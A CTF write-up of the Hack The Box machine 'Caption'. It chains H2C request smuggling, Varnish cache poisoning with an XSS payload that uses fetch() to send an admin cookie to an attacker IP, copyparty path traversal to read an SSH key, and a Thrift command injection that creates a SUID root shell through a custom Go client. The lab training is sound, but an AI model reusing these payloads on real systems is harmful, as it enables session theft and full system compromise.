+++
date = '2026-10-22T13:08:55+02:00'
draft = false
title = 'Caption Writeup EN'
+++
**Author**: **`joy.scd01`**

**Date**: **`21/10/2026`**

![pwn.png](/images/imgs_caption/pwn.png)

# Introduction

**_Caption_** is an **Hard-level Linux** box that requires chaining multiple web vulnerabilities to gain initial access, followed by custom RPC client development for privilege escalation.

The exploitation path begins with uncovering hardcoded credentials in a Git repository to access a portal. Analyzing the backend configuration reveals a reverse proxy setup vulnerable to **H2C Smuggling**, allowing us to **bypass ACLs**. By combining this with **Varnish Cache Poisoning**, we **steal an admin cookie**. This access exposes an internal **copyparty** service, which we exploit via a **Path Traversal** to retrieve an **SSH key**. Finally, privilege escalation involves analyzing a custom **Go** application using **Apache Thrift**, discovering a **command injection** vulnerability, and writing a custom **Thrift client** to trigger the execution and obtain a **root** shell.

# Techniques Used

- **Source Code Review & Git Commit History Analysis**

- **H2C Smuggling attack (HAProxy / Varnish)**

- **Cache Poisoning**

- **Cookie Theft (Stored XSS)**

- **Copyparty Path Traversal (CVE-2023-37474)** 

- **Apache Thrift RPC Exploitation**

- **Go Scripting**

- **SUID Command Injection**

# Enumeration

## nmap

Initial scan on all ports:

```bash
nmap -p- caption
```

```text
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
```

Targeted scan with scripts and service detection:

```bash
nmap -sC -sV caption
```

```text
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http-proxy HAProxy http proxy 2.0.0 or later
|_http-title: Did not follow redirect to http://caption.htb
|_http-open-proxy: Proxy might be redirecting requests
8080/tcp open  http       Jetty
|_http-title: GitBucket
Service Info: OS: Linux; Device: load balancer; Cnel
```

**Open ports**:

- **22**/tcp - SSH

- **80**/tcp - HAProxy HTTP Proxy

- **8080**/tcp - Jetty (GitBucket)

I added **`caption.htb`** to my **`/etc/hosts`** file.

## Web Enumeration

I ran a background **gobuster** scan and **ffuf**, finding nothing of interest. The web page on port **`80`** was just a login portal.

![web1.png](/images/imgs_caption/web1.pngz)

I shifted my focus to the **Jetty HTTP** service on port **`8080`** where a **GitBucket** instance was hosted. 

![web2.png](/images/imgs_caption/web2.png)

Browsing the platform, I found two repositories:

1. **`/Caption-Portal`**:

![buck1.png](/images/imgs_caption/buck1.png)

The **`/app`** directory contained the **index** and **CSS** of the web page.

![app.png](/images/imgs_caption/app.png)

While **`/config`** contained the configuration files for the **HAProxy** and **Varnish** services.

![config.png](/images/imgs_caption/config.png)

2. **`/Logservice`**:

![buck2.png](/images/imgs_caption/buck2.png)

Contained the source code of an **internal log service** (the **`server.go`** file specified it was running on port **`9090`**).

![logservice.png](/images/imgs_caption/logservice.png)

**Note**: _**HAProxy** acts as a reverse proxy and load balancer, distributing user traffic across backend servers to prevent overload and cutting off unreachable nodes via active health checks. **Varnish**, on the other hand, is an HTTP accelerator (caching reverse proxy) that stores copies of server-generated webpages directly in RAM, serving subsequent requests instantly from memory without hitting the backend again._

Before diving deep into the code, I checked the **commit history**. A mandatory step when dealing with exposed **Git** repositories. I found a cleartext password in commit **`98f2c36131078270dd3e11865f7a559d488666a1`**.

![clearpass.png](/images/imgs_caption/clearpass.png)

I used this password to log in to the **Caption-Portal** as the user **`margo`**.

![logged.png](/images/imgs_caption/logged.png)

Inside the portal, the **`Firewall`** section displayed a note: 

![note.png](/images/imgs_caption/note.png)

Visiting the **`Logs`** section returned a **`403 Forbidden`**.

![403.png](/images/imgs_caption/403.png)

---

# Initial Access | H2C Smuggling → Cache Poisoning → Stored XSS → CVE-2023-37474 → ECDSA Key

At this point, I analyzed the proxy configurations from the **Git** repository to understand why I was being blocked.

The **HAProxy** server binds on port **`80`** and forwards traffic to the backend server (**Varnish**), listening on **`localhost:6081`**:

![code1.png](/images/imgs_caption/code1.png)

Three **Access Control Lists** (**ACLs**) process the requests:

1. Denies requests if the path contains bad characters like **`//`** or **`%`**.

2. Denies requests if the path starts with **`/logs`** or **`/download`**.

2. Redirects any host header other than **`caption.htb`**.

The **`varnish.service`** file confirmed it was listening on **`localhost:6081`** and accepts **`HTTP/2`** requests.

![varnis.png](/images/imgs_caption/varnis.png)

The **`default.vcl`** file showed that if a page is cached, it returns the response; if not, it forwards the request to the internal web app on port **`8000`**.

```vcl
<SNIPPET>
    vcl 4.0;
     
    backend default {
        .host = "127.0.0.1";
        .port = "8000";
    }
<SNIPPET>
```

This configuration is perfectly aligned for an **H2C Smuggling attack**. 

**Note**: _**H2C Smuggling** leverages the **HTTP/1.1** Upgrade mechanism to establish a direct **HTTP/2** cleartext (**h2c**) tunnel with a backend server through a reverse proxy. Once the proxy processes the upgrade, it stops parsing the **HTTP** traffic and acts as a blind **TCP** relay. This allows an attacker to communicate directly with the backend, **bypassing front-end ACLs**, **accessing internal endpoints**, performing **SSRF**, and **injecting arbitrary HTTP headers** (**Header Spoofing**) that would normally be stripped or sanitized by the front-end proxy._

**HAProxy** blocks **`/logs`** and **`/download`** via ACLs, but it blindly forwards the **`Upgrade`** and **`Connection`** headers to the backend. Since **Varnish** accepts **HTTP/2** over cleartext (**h2c**), sending a request with **`Upgrade: h2c`** causes **HAProxy** to establish a persistent tunnel to **Varnish**. After the **101 Switching Protocols** response, **HAProxy** stops inspecting the traffic and treats it as a raw byte stream. I can then send "**smuggled**" **HTTP/2** requests inside that tunnel to reach restricted paths, completely bypassing the **HAProxy ACLs**.

After testing the vulneribilty using [h2csmuggler](https://github.com/BishopFox/h2csmuggler)

![h2c.png](/images/imgs_caption/h2c.png)

I extracted **`margo`**'s session cookie from the browser console

![cookie2.png](/images/imgs_caption/cookie2.png)

And targeted the restricted **`/logs`** endpoint:

```bash
python3 h2csmuggler.py -x http://caption.htb http://caption.htb/logs -H 'Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...'
```

![h2c2.png](/images/imgs_caption/h2c2.png)

I successfully reached **`/logs`** through the tunnel, but received a **`role_error`**. This indicated the presence of different privilege levels (such as an **admin role**) within the application. Coupled with the notice I found earlier in the **`Firewall`** section, stating that admins were actively working on those services. Also, inspecting the session cookie revealed that it lacked the **`HttpOnly`** flag.

![cookie1.png](/images/imgs_caption/cookie1.png)

**Note**: _The application's session cookie lacked the **`HttpOnly`** flag, making it susceptible to theft via **Cross-Site Scripting** (**XSS**)._

This critical detail, combined with the presence of an administrative bot, immediately shifted my thought process toward finding an **XSS vulnerability** to perform a **Cookie Theft**.

Browsing **`/firewalls`** in **Burp Suite**, I noticed the response was served from **Varnish**'s cache. Furthermore, the application reflected the **`X-Forwarded-Host`** header into the **`utm_source`** parameter within **`href`** and **`src`** tags without sanitization.

Since I knew **h2c** smuggling allows for **arbitrary header spoofing**, I crafted a payload to poison the **Varnish** cache exactly when the cached entry expired:

```text
X-Forwarded-Host: stars"></script><script>fetch("http://10.10.16.77:22667/log?cookie="+btoa(document.cookie));</script><"
```

When the backend fetched this, **Varnish** stored the poisoned response. Once the automated admin bot visited the page, it received the cached **XSS** payload, executed the **JavaScript**, and sent its **admin cookie** to my listener.

![poison.png](/images/imgs_caption/poison.png)

With the admin cookie secured, I smuggled another request to **`/logs`**:

```bash
python3 h2csmuggler.py -x http://caption.htb http://caption.htb/logs -H 'Cookie: session=<admin_cookie>'
```

![h2c3.png](/images/imgs_caption/h2c3.png)

I requested the **`ssh_logs`** endpoint but found nothing immediately useful. I then requested **`/download?url=http://127.0.0.1:3923/`** directly. Analyzing the **HTML source** of this response, I noticed references to a **`/.cpr/`** directory. This revealed the backend application on port **`3923`** was **copyparty**, a lightweight file-sharing server written in **Python**.

Searching for copyparty exploits led me to a known **Path Traversal** vulnerability (**CVE-2023-37474**):
- https://www.exploit-db.com/exploits/51636

**Note**: _**Copyparty** versions prior to **`1.8.6`** suffer from an **unauthenticated Directory Traversal** vulnerability. The application fails to properly sanitize URL-encoded paths, allowing an attacker to escape the web root and **read arbitrary files** on the system._

I initially ran into trouble getting the **path traversal** to work reliably through the **H2C tunnel**. I asked an **AI** for assistance with the command structure, which helped me realize that **double URL-encoding** was required: the first encoding allows the request to pass safely through the proxy layer, while the second encoding ensures the backend service effectively executes the traversal.

![passwd.png](/images/imgs_caption/passwd.png)

Once I confirmed the path traversal, my first instinct was to search for a standard **SSH key**, this is where I really hit a wall. Looking back, I realized I had missed an important detail present in the **`ssh_logs`** output: the **SSH key** was indeed there, but it used the **ECDSA** format (**`id_ecdsa`**) rather than **RSA**. 

**Note**: _**ECDSA** (Elliptic Curve Digital Signature Algorithm) is an asymmetric cryptography algorithm based on elliptic curves. Compared to traditional **RSA**, **ECDSA** provides high security using much shorter keys. For this reason, it is increasingly used by default on modern **Linux** systems._

![ssh_key.png](/images/imgs_caption/ssh_key.png)

I successfully retrieved **`margo`**'s private key, allowing me to **SSH** into the box.

![initial.png](/images/imgs_caption/initial.png)

---

# Privilege Escalation | Apache Thrift RPC Exploitation → Go Scripting → SUID Command Injection

Logging in as **`margo`**, I enumerated the internal system and focused on the service running on port **`9090`**.

```bash
ss -tuln
ps aux | grep server.go
```

![9090.png](/images/imgs_caption/9090.png)

![psaux.png](/images/imgs_caption/psaux.png)

The process was running as **root**, making it the prime target for **full compromise**. I returned to the **GitBucket** repository to analyze the **Logservice source code**.

The **`.thrift`** file defined a single **RPC method**:

![thrift.png](/images/imgs_caption/thrift.png)

In **`server.go`**, the **`ReadLogFile`** function takes a user-supplied **`filePath`**, opens it with **`os.Open`** (resulting in an **Arbitrary File Read** vulnerability), and parses it line by line looking for an **IP** and a **user-agent** field. It then constructs a shell command:

![server.png](/images/imgs_caption/server.png)

The **`userAgent`** variable is injected directly into the **`exec.Command`** string without sanitization, leading to **Command Injection**.

Since I control the contents of any file I create as **`margo`**, I wrote a malicious log file to **`/tmp/fall.log`** containing my payload inside the **user-agent** field:

```bash
echo "\"user-agent\":\"fall';cp /bin/bash /tmp/bash;chmod u+s /tmp/bash;'fall\"" > /tmp/fall.log
```

This payload breaks out of the **`echo`** statement, copies the **bash binary** to **`/tmp/bash`**, and assigns it the **SUID** bit. Because the **Thrift service** runs as **root**, this binary will become a **root shell**.

To trigger the vulnerability, I needed an **Apache Thrift client**. Since I had never programmed in **Go** before, I did some research and used an **AI** to help me build and structure the client. I cloned the repository and set up a **Go workspace** to compile it:

```bash
git clone http://caption.htb:8080/git/root/Logservice.git
cd Logservice
find gen-go -type d          
sudo mkdir -p /usr/local/go/src
sudo cp -r gen-go/log_service /usr/local/go/src/
cd /usr/local/go/src/log_service && sudo go mod init log_service
```

I then created my client project:

```bash
mkdir -p ~/HTB/Machines/Caption/thrift-client && cd ~/HTB/Machines/Caption/thrift-client
go mod init main
```

**`client.go`**:

```Go
package main

import (
    "context"
    "log"

    "github.com/apache/thrift/lib/go/thrift"
    logservice "log_service"
)

func main() {
    // transport --> localhost:9090
    transport, err := thrift.NewTSocket("localhost:9090")
    if err != nil {
        log.Fatalf("Error creating transport: %v", err)
    }
    defer transport.Close()

    // open connection
    if err := transport.Open(); err != nil {
        log.Fatalf("Error opening transport: %v", err)
    }
    log.Println("Transport opened")

    // configure binary protocol
    protocolFactory := thrift.NewTBinaryProtocolFactoryDefault()
    protocol := protocolFactory.GetProtocol(transport)

    // LogService client
    client := logservice.NewLogServiceClientProtocol(transport, protocol, protocol)

    // call ReadLogFile through the target path
    ctx := context.Background()
    filePath := "/tmp/fall.log" // <-- payload path

    result, err := client.ReadLogFile(ctx, filePath)
    if err != nil {
        log.Fatalf("Error calling ReadLogFile: %v", err)
    }
    log.Println("ReadLogFile result:", result)
}
```

To link the generated **Thrift** bindings locally, I updated **`go.mod`**:

```Go
require log_service v0.0.0

replace log_service => /usr/local/go/src/log_service
```

Because the service is bound locally on the target, I used **SSH local port forwarding** to bridge port **`9090`** to my attacker machine:

```bash
ssh -L 9090:127.0.0.1:9090 -i id_ecdsa margo@caption.htb
```

Finally, I compiled and ran the client:

```bash
go mod tidy
go run client.go
```

![readlog.png](/images/imgs_caption/readlog.png)

On the target machine, the payload triggered perfectly. I executed the **SUID** binary with the **`-p`** flag to preserve permissions:

```bash
/tmp/bash -p
```

![rootfù.png](/images/imgs_caption/rootfù.png)

**Root** achieved.

---

# Final Thoughts

This box took me about 3 days to pwn, primarily due to the steep learning curve of some of the newer concepts it introduced.

Studying and properly executing the **H2C Smuggling** technique took significant time, and chaining it with **Varnish cache poisoning** to **steal the cookie** was a brilliant kill chain. The privilege escalation felt slightly easier than the foothold but still required solid **code review** fundamentals and the ability to script an **RPC client** in **Go**, which was a great learning experience (I utilized an **AI** to help structure the **Go** boilerplate). Overall, the "**Hard**" rating is well-deserved, and the box flows with incredible technical depth and zero guesswork.

**Sources**:

- **H2C Smuggler (BishopFox) | https://github.com/BishopFox/h2csmuggler**

- **Copyparty Path Traversal (CVE-2023-37474) | https://www.exploit-db.com/exploits/51636**

- **H2C Smuggling Vulnerability (PortSwigger) | https://portswigger.net/web-security/http-smuggling/advanced/h2c-smuggling**

- **Apache Thrift Go Library | https://github.com/apache/thrift**